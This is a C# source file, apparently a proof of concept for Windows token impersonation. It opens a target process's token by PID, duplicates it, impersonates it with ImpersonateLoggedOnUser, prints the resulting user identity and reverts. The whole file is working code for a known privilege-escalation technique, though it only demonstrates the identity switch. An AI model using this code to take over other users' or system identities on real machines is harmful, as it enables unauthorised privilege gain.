using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;




namespace TokenImpersonation
{
    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        static void Main(string[] args)
        {
            // Check if the correct number of arguments were passed in.
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: TokenImpersonation <pid>");
                return;
            }

            // Check if the passed argument is a valid integer (PID).
            if (!int.TryParse(args[0], out int pid))
            {
                Console.WriteLine("Invalid PID");
                return;
            }

            // Print the current user context of the program
            PrintCurrentUser();

            // Get the process with the specified PID.
            Process targetProcess = GetTargetProcessById(pid);
            if (targetProcess == null)
            {
                Console.WriteLine("Process with PID {0} not found", pid);
                return;
            }

            Console.WriteLine("Found target process with PID {0} (GetProcessById)", pid);

            // Get the token handle of the target process.
            IntPtr tokenHandle = GetTokenHandle(targetProcess);
            if (tokenHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenProcessToken failed with error code: {0}", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("Successfully got token handle of target process (OpenProcessToken)");

            // Duplicate the token handle.
            IntPtr duplicateTokenHandle = DuplicateTokenHandle(tokenHandle);
            if (duplicateTokenHandle == IntPtr.Zero)
            {
                Console.WriteLine("DuplicateToken failed with error code: {0}", Marshal.GetLastWin32Error());
                CloseHandle(tokenHandle);
                return;
            }

            Console.WriteLine("Successfully duplicated token handle (DuplicateToken)");

            // Close the original token handle.
            CloseHandle(tokenHandle);

            // Impersonate the user and run the `whoami` command.
            ImpersonateToken(duplicateTokenHandle);


            

            // Close the duplicated token handle.
            CloseHandle(duplicateTokenHandle);
        }



        // Get the process with the specified PID.
        private static Process GetTargetProcessById(int pid)
        {
            try
            {
                return Process.GetProcessById(pid);
            }
            catch
            {
                return null;
            }
        }

        // Get the token handle of the target process.
        private static IntPtr GetTokenHandle(Process targetProcess)
        {
            IntPtr processHandle = targetProcess.Handle;
            IntPtr tokenHandle;
            const uint TOKEN_DUPLICATE = 0x0002;
            const uint TOKEN_QUERY = 0x0008;

            // Open the token handle of the target process.
            return OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out tokenHandle) ? tokenHandle : IntPtr.Zero;
        }

        // Duplicate the token handle.
        private static IntPtr DuplicateTokenHandle(IntPtr tokenHandle)
        {
            IntPtr duplicateTokenHandle;
            const int SecurityImpersonation = 2;

            // Duplicate the token handle.
            return DuplicateToken(tokenHandle, SecurityImpersonation, out duplicateTokenHandle) ? duplicateTokenHandle : IntPtr.Zero;
        }

        // Impersonate the user.

        /** // This an alternate technique for impersonation
        private static void ImpersonateToken(IntPtr duplicateTokenHandle)
        {
            // Create a safe handle to the duplicated token
            SafeAccessTokenHandle safeAccessTokenHandle = new SafeAccessTokenHandle(duplicateTokenHandle);

            // Run the code block impersonating the token
            WindowsIdentity.RunImpersonated(safeAccessTokenHandle, () =>
            {

                // Get the current Windows identity
                string output = WindowsIdentity.GetCurrent().Name;

                // Write the impersonated user name to the console
                Console.WriteLine("Impersonated user: {0}", output);
            
                Console.WriteLine("Successfully impersonated token (RunImpersonated)");

            });
        }
        **/



        private static void ImpersonateToken(IntPtr duplicateTokenHandle)
        {
            // Impersonate the logged-on user with the duplicated token
            if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
            {
                Console.WriteLine("ImpersonateLoggedOnUser failed with error code: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("Successfully impersonated user (ImpersonateLoggedOnUser)");

            // Get the current Windows identity
            //string output = WindowsIdentity.GetCurrent().Name;

            // Write the impersonated user name to the console
            //Console.WriteLine("Impersonated user: {0}", output);

            PrintCurrentUser();

            // Revert to the previous user context
            if (!RevertToSelf())
            {
                Console.WriteLine("RevertToSelf failed with error code: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("Successfully reverted to the previous user context (RevertToSelf)");

            PrintCurrentUser();
        }


        private static void PrintCurrentUser()
        {
            // Get the current Windows identity
            string output = WindowsIdentity.GetCurrent().Name;

            // Write the impersonated user name to the console
            Console.WriteLine("[+] Current user context: {0}", output);
        }

    }


}

